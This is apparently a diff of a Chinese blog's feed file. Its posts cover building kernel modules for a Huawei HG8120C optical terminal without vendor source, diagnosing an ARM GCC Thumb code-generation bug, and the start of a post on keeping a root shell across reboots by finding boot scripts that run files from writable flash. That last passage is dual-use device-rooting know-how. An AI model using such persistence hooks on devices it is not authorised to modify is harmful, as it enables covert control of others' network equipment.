+        int                        policy;               /*   300     4 */
+        int                        partno;               /*   304     4 */
+        long unsigned int          stamp;                /*   308     4 */
+        int                        in_flight[2];         /*   312     8 */
+        /* --- cacheline 5 boundary (320 bytes) --- */
+        struct disk_stats *        dkstats;              /*   320     4 */
+        struct rcu_head            rcu_head;             /*   324     8 */
+
+        /* size: 336, cachelines: 6, members: 12 */
+        /* padding: 4 */
+        /* last cacheline: 16 bytes */
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这回可疑的是 &lt;code&gt;struct device __dev&lt;/code&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C device drivers/block/loop.ko
+struct device {
+        struct device *            parent;               /*     0     4 */
+        struct device_private *    p;                    /*     4     4 */
+        struct kobject             kobj;                 /*     8    36 */
+        const char  *              init_name;            /*    44     4 */
+        struct device_type *       type;                 /*    48     4 */
+        struct semaphore           sem;                  /*    52    16 */
+        /* --- cacheline 1 boundary (64 bytes) was 4 bytes ago --- */
+        struct bus_type *          bus;                  /*    68     4 */
+        struct device_driver *     driver;               /*    72     4 */
+        void *                     platform_data;        /*    76     4 */
+        struct dev_pm_info         power;                /*    80   120 */
+        /* --- cacheline 3 boundary (192 bytes) was 8 bytes ago --- */
+        ...
+        ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;power&lt;/code&gt; 的大小很可疑，我们来看看 &lt;a href=&quot;http://elixir.free-electrons.com/linux/v2.6.34.10/source/include/linux/pm.h#L451&quot; title=&quot;include/linux/pm.h#L451&quot;&gt;&lt;code&gt;struct dev_pm_info&lt;/code&gt;&lt;/a&gt; 在头文件中的定义，一眼就可以发现其中有两个 &lt;code&gt;CONFIG_*&lt;/code&gt; 控制的宏，检查 &lt;code&gt;.config&lt;/code&gt; 文件，发现这两配置确实是打开的，估计这就是罪魁祸首。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;451 struct dev_pm_info {
+452         pm_message_t            power_state;
+453         unsigned int            can_wakeup:1;
+454         unsigned int            should_wakeup:1;
+455         unsigned                async_suspend:1;
+456         enum dpm_state          status;         /* Owned by the PM core */
+457 #ifdef CONFIG_PM_SLEEP
+458         struct list_head        entry;
+459         struct completion       completion;
+460 #endif
+461 #ifdef CONFIG_PM_RUNTIME
+462         struct timer_list       suspend_timer;
+463         unsigned long           timer_expires;
+464         struct work_struct      work;
+465         wait_queue_head_t       wait_queue;
+466         spinlock_t              lock;
+467         atomic_t                usage_count;
+468         atomic_t                child_count;
+469         unsigned int            disable_depth:3;
+470         unsigned int            ignore_children:1;
+471         unsigned int            idle_notification:1;
+472         unsigned int            request_pending:1;
+473         unsigned int            deferred_resume:1;
+474         unsigned int            run_wake:1;
+475         unsigned int            runtime_auto:1;
+476         enum rpm_request        request;
+477         enum rpm_status         runtime_status;
+478         int                     runtime_error;
+479 #endif
+480 };
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;关掉 &lt;code&gt;CONFIG_PM_SLEEP&lt;/code&gt; 和 &lt;code&gt;CONFIG_PM_RUNTIME&lt;/code&gt; 这两个配置，重新编译 &lt;code&gt;loop.ko&lt;/code&gt;，再来检查 &lt;code&gt;queue&lt;/code&gt; 的偏移量：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C gendisk drivers/block/loop.ko|grep queue
+        struct request_queue *     queue;                /*   284     4 */
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;284 == 0x11c，已经和原始内核中的偏移量保持一致，可以到设备上进行测试了。&lt;/p&gt;
+&lt;h1&gt;测试 loop.ko 和 ext2.ko&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;WAP(Dopra Linux) # insmod loop.ko
+WAP(Dopra Linux) # mkdir ext2-mount-test
+WAP(Dopra Linux) # mount -t ext2 -o loop ext2.img ext2-mount-test
+WAP(Dopra Linux) # cd ext2-mount-test
+WAP(Dopra Linux) # &amp;gt; test.txt echo &#39;ext2 fs create/write test.&#39;; ls
+lost+found/ test.txt
+WAP(Dopra Linux) # cat test.txt
+ext2 fs create/write test.
+WAP(Dopra Linux) # rm test.txt; ls
+lost+found/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看起来是一切正常了。&lt;code&gt;ext2.ko&lt;/code&gt; 和 &lt;code&gt;loop.ko&lt;/code&gt; 能够正常运行的 &lt;a href=&quot;https://github.com/LeeXiaolan/hwfw-tool/tree/master/linux-2.6.34.10&quot; title=&quot;config and patches&quot;&gt;&lt;code&gt;config&lt;/code&gt; 文件和补丁&lt;/a&gt;，适用于 &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v2.6/longterm/v2.6.34/linux-2.6.34.10.tar.xz&quot; title=&quot;linux-2.6.34.10.tar.xz&quot;&gt;linux-2.6.34.10&lt;/a&gt;。顺带一提，&lt;code&gt;xt_hashlimit.ko&lt;/code&gt; 也可以正常运行。&lt;/p&gt;
+&lt;h1&gt;结论&lt;/h1&gt;
+&lt;p&gt;上述因为 &lt;code&gt;CONFIG_*&lt;/code&gt; 引起的结构体内存布局差异定位起来还是比较容易的，而刚好上面的例子中差异很大，更容易定位。而另一种因为厂商夹带私货引起的内存布局差异，就需要比对更多的成员偏移来精确定位和补丁。&lt;/p&gt;
+&lt;p&gt;模块和内核之间交互就是通过一组导出函数和各种内核对象进行的。导出函数缺失在加载模块时就能被发现，直接后果就是加载内核模块失败。而内核对象的内存布局，只有到运行时才能发现错误。故只要保证内核对象的内存布局一致，在没有源代码和对应 &lt;code&gt;config&lt;/code&gt; 文件的情况下，使用 &lt;code&gt;out-of-tree&lt;/code&gt; 来编译某些内核模块是完全可行的。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">编译 OpenVPN 邂逅 ARM GCC bug</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2017-12-22T13:35:38Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html"/>
+      <id>https://blog.leexiaolan.tk/entry/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont</id>
+      <title>编译 OpenVPN 邂逅 ARM GCC bug</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;这几天折腾在 HG8120C 光猫（ONT）上运行 OpenVPN，历经千辛万苦编译成功了，结果运行中 Assert 失败，一路排查下来，最后发现居然是工具链 GCC 的错。这已经不是第一次遇到工具链的 bug了，第一次是 &lt;a title=&quot;ARM编译器ADS1.2 Build 848存在乱序优化Bug&quot; href=&quot;/%E7%BC%96%E8%AF%91%E5%99%A8ADS%E4%B9%B1%E5%BA%8F%E4%BC%98%E5%8C%96%E5%AD%98%E5%9C%A8Bug.html&quot;&gt;ARM ADS&lt;/a&gt; 乱序优化的 bug，第二次是 &lt;a title=&quot;链接器中Thumb BLX指令编码&quot; href=&quot;/Thumb-BLX-Instruction-Encoding.html&quot;&gt;自己写的链接器&lt;/a&gt;，如果这也算的话。&lt;/p&gt;
+&lt;h1&gt;发现&lt;/h1&gt;
+&lt;p&gt;在 &lt;a title=&quot;HG8120C持久root shell及完美解决IPv6丢包&quot; href=&quot;/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html&quot;&gt;实现了 HG8120C 的持久 root shell&lt;/a&gt; 后，就在上面运行了 PPTP 服务，用于充当出门在外身处非安全网络环境中时使用的 VPN 网关。家庭网络中，本来 ONT 一般就是不断电的，而且 HG8120C 上内存和处理器资源也还算充足，所以拿来做 VPN 网关很节能环保。但是 PPTP 很多年前就已经是 &lt;a title=&quot;PPTP Security&quot; href=&quot;https://en.wikipedia.org/wiki/Point-to-Point_Tunneling_Protocol#Security&quot;&gt;不安全的协议&lt;/a&gt; 了。终于下定决心用 OpenVPN 替换 PPTP 了，可是过程并不平坦。&lt;/p&gt;
+&lt;p&gt;由于我还有 Windows XP 客户端，所以选择了最后支持 XP 的 OpenVPN v2.3.14 版本。几经周折总算是编译成功了，其中磕跘暂且不表。配置好服务起客户端，开始进行连接测试，当客户端连接成功后，服务器却显示出了错误的信息，紧接着就退出了，到底发生了什么？&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Sat May  6 18:33:38 2017 banana/192.168.1.10:48029 Assertion failed at crypto.c:173 (buf_inc_len(&amp;amp;work, outlen))
+Sat May  6 18:33:38 2017 banana/192.168.1.10:48029 Exiting due to fatal error
+Sat May  6 18:33:38 2017 banana/192.168.1.10:48029 /sbin/route del -net 10.8.0.0 netmask 255.255.255.0
+Sat May  6 18:33:38 2017 banana/192.168.1.10:48029 Closing TUN/TAP interface
+Sat May  6 18:33:38 2017 banana/192.168.1.10:48029 /sbin/ifconfig tun0 0.0.0.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Assertion failed at crypto.c:173 (buf_inc_len(&amp;amp;work, outlen))，很明显的断言失败信息。查看源代码 &lt;a href=&quot;https://github.com/OpenVPN/openvpn/blob/117dadc02d163a3e93c28ef7bd296c8dfa1f6156/src/openvpn/crypto.c#L173&quot;&gt;crypto.c #173&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;167   /* Encrypt packet ID, payload */
+168   ASSERT (cipher_ctx_update (ctx-&amp;gt;cipher, BPTR (&amp;amp;work), &amp;amp;outlen, BPTR (buf), BLEN (buf)));
+169   ASSERT (buf_inc_len(&amp;amp;work, outlen));
+170
+171   /* Flush the encryption buffer */
+172   ASSERT (cipher_ctx_final(ctx-&amp;gt;cipher, BPTR (&amp;amp;work) + outlen, &amp;amp;outlen));
+173   ASSERT (buf_inc_len(&amp;amp;work, outlen));
+174
+175   /* For all CBC mode ciphers, check the last block is complete */
+176   ASSERT (cipher_kt_mode (cipher_kt) != OPENVPN_MODE_CBC ||
+177       outlen == iv_size);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;跟踪进 &lt;code&gt;buf_inc_len&lt;/code&gt; 函数所在的 &lt;a href=&quot;https://github.com/OpenVPN/openvpn/blob/117dadc02d163a3e93c28ef7bd296c8dfa1f6156/src/openvpn/buffer.h#L461&quot;&gt;&lt;code&gt;buffer.h&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;412 static inline bool
+413 buf_safe_bidir (const struct buffer *buf, int len)
+414 {
+415   if (buf_valid (buf) &amp;amp;&amp;amp; buf_size_valid_signed (len))
+416     {
+417       const int newlen = buf-&amp;gt;len + len;
+418       return newlen &amp;gt;= 0 &amp;amp;&amp;amp; buf-&amp;gt;offset + newlen &amp;lt;= buf-&amp;gt;capacity;
+419     }
+420   else
+421     return false;
+422 }
+...
+461 static inline bool
+462 buf_inc_len (struct buffer *buf, int inc)
+463 {
+464   if (!buf_safe_bidir (buf, inc))
+465     return false;
+466   buf-&amp;gt;len += inc;
+467   return true;
+468 }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在这几个函数里面加入一些诊断信息的输出，试图找到是哪个条件不满足导致的断言失败。万万没想到的是，在输出了诊断信息后，并没有引发断言失败，看起来是 &lt;a title=&quot;Observer effect&quot; href=&quot;https://en.wikipedia.org/wiki/Observer_effect_(physics)&quot;&gt;观测者效应&lt;/a&gt; 在作祟。由于有之前的两次经验，所以马上就想到可能我又遇上了第三次工具链的 bug。马上着手检查编译器生成的汇编代码（thumb 指令） &lt;code&gt;crypto.S&lt;/code&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;5250    .loc 1 173 0            ; crypto.c #173
+5251    ldr r3, [sp, #80]
+5252 .LBB1011:
+5253 .LBB1012:
+5254 .LBB1013:
+5255 .LBB1014:
+5256    .loc 3 230 0            ; buffer.h #230
+5257    ldr r2, .L474+28        ; -1000000
+5258    cmp r3, r2
+5259    bge .LCB4900
+5260    b   .L428   @long jump
+5261 .LCB4900:
+5262    ldr r0, .L474+4         ; 999999
+5263    cmp r3, r0
+5264    ble .LCB4903
+5265    b   .L428   @long jump
+5266 .LCB4903:
+5267 .LBE1014:
+5268 .LBE1013:
+5269 .LBB1015:
+5270    .loc 3 418 0            ; buffer.h #418
+5271    add r8, r8, r3
+5272    bpl .LCB4909
+5273    b   .L428   @long jump
+5274 .LCB4909:
+5275    mov r1, r8
+5276    add r3, r7, r1
+5277    cmp r9, r3
+5278    bge .LCB4913
+5279    b   .L428   @long jump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直勾勾地盯着上面的汇编代码看了好长时间，并没有发现乱序优化。那还会有什么原因呢？突然发现 &lt;code&gt;5271 add r8, r8, r3&lt;/code&gt; 之后紧跟着 &lt;code&gt;5272 bpl .LCB4909&lt;/code&gt; 条件跳转指令，而 &lt;code&gt;add&lt;/code&gt; 指令并不带 &lt;code&gt;s&lt;/code&gt; 后缀（这里的判断是误打误撞，其实 &lt;code&gt;thumb&lt;/code&gt; 指令压根就没有 &lt;code&gt;s&lt;/code&gt; 后缀，&lt;code&gt;arm&lt;/code&gt; 指令才有），应该不会影响标志位，故其后的条件跳转指令就达不到预期目的，和这两条汇编指令对应的 &lt;code&gt;C&lt;/code&gt; 代码是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;417       const int newlen = buf-&amp;gt;len + len; // r3 -&amp;gt; len, r8 -&amp;gt; buf-&amp;gt;len
+418       return newlen &amp;gt;= 0 &amp;amp;&amp;amp; ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;啊哈，就是这里的 bug。&lt;/p&gt;
+&lt;h1&gt;关于 &lt;code&gt;s&lt;/code&gt; 后缀的误打误撞&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;thumb add&lt;/code&gt; 指令有多个种类，一类指令是&lt;strong&gt;只能&lt;/strong&gt;访问到 &lt;code&gt;low registers (r0-r7)&lt;/code&gt;，这类 &lt;code&gt;add&lt;/code&gt; 指令&lt;strong&gt;会更新&lt;/strong&gt;对应标志位，而能够访问到 &lt;code&gt;high registers&lt;/code&gt; 的这类 &lt;code&gt;thumb add&lt;/code&gt; 指令，手册上明确说明&lt;strong&gt;不会更新标志位&lt;/strong&gt;。而 &lt;code&gt;r8&lt;/code&gt; 刚好是 &lt;code&gt;high register&lt;/code&gt;，汇编器 &lt;code&gt;as&lt;/code&gt; 便选择了能够访问 &lt;code&gt;high register&lt;/code&gt; 的这类 &lt;code&gt;add&lt;/code&gt; 指令，从而标志位没能得到有效更新，才导致了上述 bug。&lt;/p&gt;
+&lt;h1&gt;解决（规避）方案&lt;/h1&gt;
+&lt;p&gt;bug 是 &lt;code&gt;gcc&lt;/code&gt; 工具链导致的，使用的版本是 &lt;a title=&quot;Gnu GCC v4.4.7&quot; href=&quot;http://ftp.gnu.org/gnu/gcc/gcc-4.4.7/gcc-4.4.7.tar.bz2&quot;&gt;&lt;code&gt;gcc v4.4.7&lt;/code&gt;&lt;/a&gt;，最直接的办法是更换掉有问题的工具链，但是多方面的原因，无法评估换工具链的风险，也没能在 &lt;code&gt;gcc issue tracker&lt;/code&gt; 里找到这样的问题报告，所以不会有简单修复 &lt;code&gt;gcc&lt;/code&gt; 的办法。故只能另辟蹊径，规避掉这个 bug。&lt;code&gt;r8&lt;/code&gt; 引起的 bug，而 &lt;code&gt;r8&lt;/code&gt; 缓存的是 &lt;code&gt;buf-&amp;gt;len&lt;/code&gt;，禁用这个缓存就可以解决，最简单粗暴的方法就是将对应 &lt;code&gt;buf&lt;/code&gt; 用 &lt;code&gt;volatile&lt;/code&gt; 修饰，&lt;code&gt;gcc&lt;/code&gt; 便不会将结果缓存进 &lt;code&gt;r8&lt;/code&gt; 寄存器了。&lt;/p&gt;
+&lt;h1&gt;总结&lt;/h1&gt;
+&lt;p&gt;发生了 bug，虽然定位了问题的根源，但是一时之间还难以从根源上解决问题，只是投机取巧避而远之，更严重的是不知道是否还有其他地方存在这同样的问题，所以选择规避问题绝非正道，等后面有时间一定得从问题的根源上解决。&lt;/p&gt;
+&lt;h2&gt;2017年9月6日更新&lt;/h2&gt;
+&lt;p&gt;在深挖了 &lt;a href=&quot;http://ftp.gnu.org/gnu/gcc/gcc-4.4.7/gcc-4.4.7.tar.bz2&quot; title=&quot;Gnu GCC v4.4.7&quot;&gt;&lt;code&gt;gcc v4.4.7&lt;/code&gt;&lt;/a&gt; 源代码和阅读了大量相关 &lt;a href=&quot;https://gcc.gnu.org/onlinedocs/gccint&quot; title=&quot;GNU Compiler Collection (GCC) Internals&quot;&gt;gcc internals&lt;/a&gt; 文档之后，终于定位到生成错误汇编代码的位置，位于 &lt;a href=&quot;https://gcc.gnu.org/viewcvs/gcc/tags/gcc_4_4_7_release/gcc/config/arm/arm.md?revision=185319&amp;amp;view=markup#l7181&quot; title=&quot;addsi3_cbranch&quot;&gt;&lt;code&gt;gcc/config/arm/arm.md&lt;/code&gt; 7181 行的 &lt;code&gt;addsi3_cbranch&lt;/code&gt;&lt;/a&gt; 结构。顺着 &lt;code&gt;addsi3_cbranch&lt;/code&gt; 这个名字很快就在 gcc svn 中找到了 &lt;a href=&quot;https://gcc.gnu.org/viewcvs/gcc?view=revision&amp;amp;revision=158405&quot; title=&quot;Bug fix&quot;&gt;&lt;code&gt;Revision 158405&lt;/code&gt;&lt;/a&gt;，提交信息如下：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;* config/arm/arm.md (addsi3_cbranch): If destination is a high&lt;br /&gt;
+  register, inputs must be low registers and we need a low register&lt;br /&gt;
+  scratch.  Handle alternative 2 like alternative 3.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;看起来很像是修复这个 bug 的，马上打上这个 &lt;a href=&quot;https://gcc.gnu.org/viewcvs/gcc/trunk/gcc/config/arm/arm.md?view=patch&amp;amp;r1=158405&amp;amp;r2=158404&amp;amp;pathrev=158405&quot; title=&quot;addsi3_cbranch patch&quot;&gt;补丁&lt;/a&gt; 测试，发现生成对应的汇编代码中多使用了一个低位的临时寄存器 &lt;code&gt;r2&lt;/code&gt; 来进行加法运算，而两个低位寄存器相加是能够影响标志位的，从而使得后面的条件跳转指令能够正确执行，显然 bug 修复了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mov r2, r8
+add r2, r2, r3
+mov r8, r2
+bpl .LCB4945
+b   .L428   @long jump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用补丁后的 &lt;code&gt;gcc&lt;/code&gt; 重新编译所有软件，并更新到设备上。至此，问题完美解决。&lt;/p&gt;
+
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html">无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html">HG8120C持久root shell及完美解决IPv6丢包</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html">https://blog.leexiaolan.tk/arm-gcc-v4.4.7-bug-when-compile-openvpn-for-hg8120c-ont.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2017-05-07T00:59:01Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html"/>
+      <id>https://blog.leexiaolan.tk/entry/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont</id>
+      <title>HG8120C持久root shell及完美解决IPv6丢包</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;在博文&lt;a href=&quot;/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html&quot; title=&quot;PWN华为HG8120C光猫（三）&quot;&gt;PWN华为HG8120C光猫（三）&lt;/a&gt;中，虽然取得了&lt;code&gt;root shell&lt;/code&gt;，但不能持久，设备重启后需要重新获取。&lt;a href=&quot;/post-pwn-huawei-hg8120c-ont.html&quot; title=&quot;PWN华为HG8120C光猫之后&quot;&gt;PWN华为HG8120C光猫之后&lt;/a&gt;虽然确定了&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;丢包的是ONT引起的，但没有给出解决方案，只是规避问题。强迫症发作的你是否也对这两问题耿耿于怀呢？这次就来将两遗留问题一并完美解决，才能做到真正释怀。&lt;/p&gt;
+&lt;h1&gt;查找&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;丢包的罪魁祸首&lt;/h1&gt;
+&lt;p&gt;通过&lt;a href=&quot;/post-pwn-huawei-hg8120c-ont.html&quot; title=&quot;PWN华为HG8120C光猫之后&quot;&gt;PWN华为HG8120C光猫之后&lt;/a&gt;的分析，怀疑某个内核驱动对&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;数据包进行了错误转发。但是&lt;code&gt;lsmod&lt;/code&gt;列出的模块众多，也可能问题模块是作为&lt;code&gt;built-in&lt;/code&gt;编译在内核里面，所以当时就匆匆使用桥接方案规避了问题模块。接下来的时间里，心里就一直挂念着如何找到完美解决方案，导致食无味，寝不安。&lt;/p&gt;
+&lt;p&gt;这天，下定决心要把整个&lt;code&gt;lsmod&lt;/code&gt;列出的所以模块都检查一遍，一边运行&lt;code&gt;ping6 ipv6.google.com&lt;/code&gt;，一边一个一个模块进行移除，观察&lt;code&gt;ping6&lt;/code&gt;反馈的结果。这个过程进行得十分缓慢，原因是许多模块的卸载过程会导致随机重启，模块数量有上百个，而且引用关系复杂。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP(Dopra Linux) # lsmod|wc -l
+119
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;每当随机重启后，只能将有依赖关系的模块重新卸载，才能继续，很可能又会很快导致随机重启，近乎死循环。但是好歹还是慢慢向前推进着。当进行到&lt;code&gt;l3sfwd_ipv6&lt;/code&gt;这个模块时，感觉很像罪魁祸首，因为名字中带&lt;code&gt;ipv6&lt;/code&gt;，可以肯定和&lt;code&gt;IPv6&lt;/code&gt;有关，&lt;code&gt;fwd&lt;/code&gt;也像是单词forward（转发）缩写，&lt;code&gt;l3&lt;/code&gt;看起来像是指&lt;code&gt;layer 3&lt;/code&gt;，那个错误转发也确实是发生在三层上，一切看起来都能说得通。然而移除&lt;code&gt;l3sfwd_ipv6&lt;/code&gt;之后问题依旧。没办法，只能继续检查剩下的模块，在移除了&lt;code&gt;l3sfwd&lt;/code&gt;模块后，丢包现象消失了。费了九牛二虎之力终于找到罪魁祸首了，这个罪恶模块应该是和&lt;code&gt;IPv4&lt;/code&gt;转发相关的，毕竟&lt;code&gt;IPv6-in-IPv4&lt;/code&gt;还是&lt;code&gt;IPv4&lt;/code&gt;协议。&lt;/p&gt;
+&lt;p&gt;为了进一步确定不是多个模块组合造成的丢包，重启设备后，只移除&lt;code&gt;l3sfwd&lt;/code&gt;和两个依赖模块&lt;code&gt;l3sfwd_ipv6&lt;/code&gt;和&lt;code&gt;rawip_adpt&lt;/code&gt;，丢包问题消失，并且也不影响网络和电话功能，一切都很正常，哈哈哈哈！虽然找到了问题的根源，但如何保证设备掉电重启后，自动移除这三个引起问题的模块呢？新的问题又来了，不能高兴得太早。&lt;/p&gt;
+&lt;h1&gt;持久&lt;code&gt;root shell&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html&quot; title=&quot;PWN华为HG8120C光猫（三）&quot;&gt;之前&lt;/a&gt;获取的&lt;code&gt;root shell&lt;/code&gt;，都只是在内存&lt;code&gt;tmpfs&lt;/code&gt;中操作，设备重启后将消失。设备在&lt;code&gt;/mnt/jffs2&lt;/code&gt;上挂载了闪存文件系统&lt;code&gt;ubifs&lt;/code&gt;（没错，是&lt;code&gt;ubifs&lt;/code&gt;，不是&lt;code&gt;jffs2&lt;/code&gt;），可读写，用于保存设备的配置文件等信息。虽然可以将&lt;code&gt;root shell&lt;/code&gt;所需的文件保存在这个路径下，即使设备掉电文件也不会消失，但还必须找到方法，实现自启动，&lt;code&gt;root shell&lt;/code&gt;才能持久。&lt;/p&gt;
+&lt;h1&gt;如何实现自启动&lt;/h1&gt;
+&lt;p&gt;实现自启动最容易想到的办法就是修改&lt;code&gt;/etc/rc.d&lt;/code&gt;下的启动脚本，添加启动命令到其中。虽然最容易想到，但并不代表最容易实现。首先&lt;code&gt;/etc/rc.d&lt;/code&gt;位于根文件系统中，而根文件系统使用的是&lt;code&gt;squashfs&lt;/code&gt;只读文件系统。其次修改根文件系统风险比较高，不能fail safe，一旦根文件系统损坏，设备可能就变砖，对于在线正在使用中的网络设备，高风险的变砖情况是不可接受的，一旦变砖网络和电话就都瘫痪了。其实，HG8120C这个设备实现了双系统，但目前不知道如何操作才能保证在修改一个系统的根文件系统导致启动失败的情况下，如何自动或手动切换到另一个正常系统。综上所述，我需要找到一个低风险，fail safe的添加自启动的方法。&lt;/p&gt;
+&lt;p&gt;唯一符合这样条件的自启动方案，就是将启动命令文件存储在&lt;code&gt;/mnt/jffs2&lt;/code&gt;路径下，诱导某个系统程序在启动过程中来执行之，这样可以避免损坏&lt;code&gt;rootfs&lt;/code&gt;。&lt;/p&gt;
+&lt;h1&gt;寻找可能被诱导的程序&lt;/h1&gt;
+&lt;p&gt;跟随系统的启动脚本流程，仔细检查每个可能的切入点。最先发现可能的切入点在&lt;code&gt;/etc/rc.d/rc.start/1.sdk_init.sh&lt;/code&gt;的第76行，如果文件&lt;code&gt;/mnt/jffs2/Equip.sh&lt;/code&gt;存在，就运行&lt;code&gt;/bin/Equip.sh&lt;/code&gt;，运行成功之后就退出。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;76  [ -f /mnt/jffs2/Equip.sh ] &amp;amp;&amp;amp; /bin/Equip.sh &amp;amp;&amp;amp; exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;继续查看&lt;code&gt;/bin/Equip.sh&lt;/code&gt;，发现文件最后一行会执行&lt;code&gt;/mnt/jffs2&lt;/code&gt;路径下的某个程序：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/mnt/jffs2/equipment/bin/aging &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;乍一看，这个看似可以被利用来执行我们指定的程序&lt;code&gt;/mnt/jffs2/equipment/bin/aging&lt;/code&gt;，但是对比&lt;code&gt;1.sdk_init.sh&lt;/code&gt;后续的启动命令和&lt;code&gt;/bin/Equip.sh&lt;/code&gt;发现有太多差异，恐怕启动后设备功能不正常。所以只能当作最后的救命稻草，只有在找不到其他更好的切入点时才会使用。继续检查&lt;code&gt;1.sdk_init.sh&lt;/code&gt;，426行代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;426 #start for hw_ldsp_cfg进行单板差异化配置，必须放在前面启动
+427 iLoop=0
+428 echo -n &quot;Start ldsp_user...&quot;
+429 if [ -e /bin/hw_ldsp_cfg ]
+430 then
+431   hw_ldsp_cfg &amp;amp;
+432   while [ $iLoop -lt 50 ] &amp;amp;&amp;amp; [ ! -e /var/hw_ldsp_tmp.txt ]
+433   do
+434     #echo $iLoop
+435     iLoop=$(( $iLoop + 1 ))
+436     sleep 0.1
+437   done
+438
+439   if [ -e /var/hw_ldsp_tmp.txt ]
+440   then
+441       rm -rf /var/hw_ldsp_tmp.txt
+442   fi
+443 fi
+&lt;/code&gt;&lt;/pre&gt;
